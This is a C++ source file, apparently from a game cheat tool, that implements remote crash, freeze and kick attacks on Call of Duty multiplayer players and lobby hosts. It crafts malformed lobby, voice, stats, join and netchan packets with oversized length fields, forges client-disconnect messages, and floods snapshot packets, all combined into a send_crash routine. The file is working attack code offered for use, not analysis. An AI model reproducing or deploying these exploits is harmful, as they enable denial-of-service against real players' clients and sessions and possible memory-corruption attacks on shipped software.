#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const uint64_t xuid)
		{
			if (game::Live_IsUserSignedInToDemonware(0))
			{
				const auto dummy{ 0 };
				steam::send_instant_message(xuid, 'f', { reinterpret_cast<const char*>(&dummy), sizeof dummy });
			}
		}

		void send_info_response_overflow(const uint64_t xuid)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_INFO_RESPONSE);

			uint32_t dummy{ 0 };
			game::LobbyMsgRW_PackageUInt(&msg, "nonce", &dummy);
			game::LobbyMsgRW_PackageInt(&msg, "uiscreen", reinterpret_cast<int*>(&dummy));
			game::LobbyMsgRW_PackageUChar(&msg, "nattype", reinterpret_cast<uint8_t*>(&dummy));

			game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
			msg.write(12ui8);

			steam::send_instant_message(xuid, 'h', msg);
		}

		void send_friend_message_crash(const uint64_t xuid)
		{
			const game::JoinSessionMessage message{ game::JOIN_REQUEST };
			steam::send_instant_message(xuid, 'f', { reinterpret_cast<const char*>(&message), sizeof message });
		}
	}

	namespace lobby_msg
	{
		bool send_client_disconnect(const game::netadr_t& netadr, const game::LobbyType type, const std::uint64_t xuid)
		{
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_DISCONNECT);
			
			int lobby_type = type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "xuid", &target_xuid);

			return events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
		}
		
		void send_disconnect_client(const game::LobbySession* session, const std::uint64_t xuid)
		{
			if (session == nullptr)
				return; 
			
			char buffer[0x20000] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA);
			
			uint32_t data_mask{ 4u };
			game::LobbyMsgRW_PackageUInt(&msg, "datamask", &data_mask);
			int lobby_type = session->type;
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			uint64_t target_xuid = xuid;
			game::LobbyMsgRW_PackageXuid(&msg, "discclientxuid", &target_xuid);
			int disconnect_type = game::LOBBY_DISCONNECT_CLIENT_BADDLC;
			game::LobbyMsgRW_PackageInt(&msg, "discclient", &disconnect_type);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, session->host.info.netAdr);
		}

		void send_modified_stats_crash(const game::netadr_t& netadr)
		{
			char buffer[0x200] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_MODIFIED_STATS);
			
			int stats_size = 0x20000;
			game::LobbyMsgRW_PackageInt(&msg, "statssize", &stats_size);
			char stats_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "statsbuffer", &stats_buffer, sizeof stats_buffer);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
		}

		void send_voice_packet_crash(const game::netadr_t& netadr)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_VOICE_PACKET);

			int dummy{ 0 };
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &dummy);
			game::LobbyMsgRW_PackageUChar(&msg, "talker", reinterpret_cast<uint8_t*>(&dummy));
			game::LobbyMsgRW_PackageInt(&msg, "relaybits", &dummy);
			uint16_t voice_data_size = 1198 + sizeof(uint32_t);
			game::LobbyMsgRW_PackageUShort(&msg, "sizeofvoicedata", &voice_data_size);
			game::LobbyMsgRW_PackageUChar(&msg, "numpackets", reinterpret_cast<uint8_t*>(&dummy));
			char voice_data_buffer[0x100] = { 0 };
			game::LobbyMsgRW_PackageGlob(&msg, "voicedata", &voice_data_buffer, sizeof voice_data_buffer);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_PEER_TO_PEER, msg, netadr);
		}

		void send_state_game_crash(const game::netadr_t& netadr)
		{
			char buffer[0x800] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_STATE_GAME);

			game::Msg_LobbyStateGame data{};
			data.core.lobbyMode = game::LOBBY_MODE_CUSTOM;
			data.compressedBufferSize = 0x20000;
			game::call(0x7FF6C71B5810, &data, &msg);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr);
		}

		void send_join_lobby_crash(const game::netadr_t& netadr)
		{
			char buf[0x800] = {};
			game::msg_t msg = {};

			msg.init_lobby(buf, game::MESSAGE_TYPE_JOIN_LOBBY);

			game::Msg_JoinParty data{};
			data.memberCount = 0x20000;
			game::call(0x7FF6C71C2110, &data, &msg);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
		}
		
		void send_server_info_overflow(const game::netadr_t& netadr)
		{
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_SERVERLIST_INFO);

			uint8_t platform{ 0 };
			game::LobbyMsgRW_PackageUChar(&msg, "platform", &platform);

			game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
			msg.write(12ui8);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
		}

		void send_client_content_crash(const game::LobbySession* session, const game::netadr_t& netadr, const uint64_t xuid)
		{
			if (session == nullptr)
				return; 
			
			char buffer[0x400] = { 0 };
			game::msg_t msg{};

			msg.init_lobby(buffer, game::MESSAGE_TYPE_LOBBY_CLIENT_CONTENT);

			game::Msg_ClientContent data{};
			data.dataMask = 0x20000;
			data.lobbyType = session->type;
			data.clientXUID = xuid;
			game::call(0x7FF6C71B4DF0, &data, &msg);

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_CLIENT, msg, netadr);
		}
	}

	void send_connect_from_lobby(const game::netadr_t& netadr, const uint64_t xuid)
	{
		char buffer[2048] = { 0 };
		game::msg_t msg{};

		msg.init(buffer, sizeof buffer);
		msg.write_data("cfl");
		msg.write<uint64_t>(xuid);
		msg.write<uint16_t>(std::numeric_limits<uint16_t>::max());

		game::net::oob::send(netadr, { msg.data, static_cast<std::string::size_type>(msg.cursize) });
	}
	
	void send_connect_response_migration_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "mstart");
	}

	void send_request_stats_packet(const game::netadr_t& netadr)
	{
		PRINT_LOG("Sending requeststats packet to %s", utils::get_sender_string(netadr).data());
		game::net::oob::send(netadr, "requeststats\n");
	} 

	void send_lost_reliable_cmds_kick(const game::netadr_t& netadr, const uint64_t xuid)
	{
		for (size_t i = 0; i < 0x1000; ++i)
		{
			scheduler::once([=]()
			{
				const auto clc = game::clc();

				if (!clc || !clc->serverAddress.connected())
					return;

				game::net::netchan::write_packet msg{};
				msg.server_id = game::cl()->serverId;
				msg.acknowledge = std::numeric_limits<char>::max() + 1;
				msg.data = utils::string::random(16);

				const auto ingame = game::in_game();

				if (ingame)
					msg.command_sequence = i;

				const auto to = ingame ? clc->serverAddress : netadr;

				game::net::netchan::write(msg, to, xuid, 1);
			}, scheduler::pipeline::main, i * 10ms);
		}
	}

	void send_update_svcmd_overflow(const game::netadr_t& netadr, const uint64_t xuid)
	{
		const auto clc = game::clc();

		if (!clc || !clc->serverAddress.connected())
			return;

		game::net::netchan::write_packet msg{};
		msg.server_id = game::cl()->serverId;
		constexpr auto sequence = std::numeric_limits<int>::max();
		msg.message_sequence = sequence;
		msg.command_sequence = sequence;

		game::net::netchan::write(msg, netadr, xuid, 1);
	}

	void send_invalid_cmd_sequence_crash(const game::netadr_t& netadr, const uint64_t xuid)
	{
		const auto clc = game::clc();

		if (!clc || !clc->serverAddress.connected())
			return;

		game::net::netchan::write_packet msg{};
		msg.server_id = game::cl()->serverId;
		msg.command_sequence = std::numeric_limits<uint16_t>::max();
		msg.acknowledge = std::numeric_limits<char>::max() + 1;
		msg.data = utils::string::random(16);

		game::net::netchan::write(msg, netadr, xuid, 1);
	}

	void send_sv_gamestate_crash(const game::netadr_t& netadr, const uint64_t xuid)
	{
		const auto clc = game::clc();

		if (!clc || !clc->serverAddress.connected())
			return;

		game::net::netchan::write_packet msg{};
		msg.server_id = std::numeric_limits<uint8_t>::max();
		constexpr auto sequence = std::numeric_limits<uint16_t>::max(); 
		msg.message_sequence = sequence;
		msg.command_sequence = sequence;

		game::net::netchan::write(msg, netadr, xuid, 1);
	}

	void send_netchan_freeze(const game::netadr_t& netadr)
	{
		for (size_t i = 0; i < 1024; ++i)
		{
			scheduler::once([netadr]()
			{
				std::string data;
				data.resize(0x20000 + 0x100, 'a');

				game::net::netchan::send(game::NETCHAN_SNAPSHOT, data, netadr, 0, utils::random<uint64_t>());
			}, scheduler::pipeline::main, i * 10ms);
		}
	}

	void send_crash(const game::netadr_t& netadr, const std::uint64_t xuid, const bool freeze)
	{
		PRINT_LOG("Sending crash packets to %s", utils::get_sender_string(netadr).data());
		
		if (freeze)
		{
			lobby_msg::send_server_info_overflow(netadr); 
		}
		else
		{
			game::net::netchan::send(game::NETCHAN_VOICE, "Vt", netadr);
			game::net::oob::send(netadr, "Relay");
			game::net::oob::send(netadr, "Vt");
			game::net::netchan::send_oob(netadr, "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");

			instant_message::send_friend_message_crash(xuid);

			lobby_msg::send_modified_stats_crash(netadr);
			lobby_msg::send_voice_packet_crash(netadr);
			lobby_msg::send_state_game_crash(netadr);
			lobby_msg::send_join_lobby_crash(netadr);
			lobby_msg::send_client_content_crash(game::session_data(), netadr, xuid);

			char buf[0x10000] = {0};
			game::msg_t msg{};

			msg.init_lobby(buf, game::MESSAGE_TYPE_SERVERLIST_INFO);

			while (msg.cursize < msg.maxsize)
			{
				msg.write<uint8_t>(game::MESSAGE_ELEMENT_DEBUG_START);
			}

			events::lobby_msg::send_lobby_msg(game::LOBBY_MODULE_HOST, msg, netadr);
		}
	}
}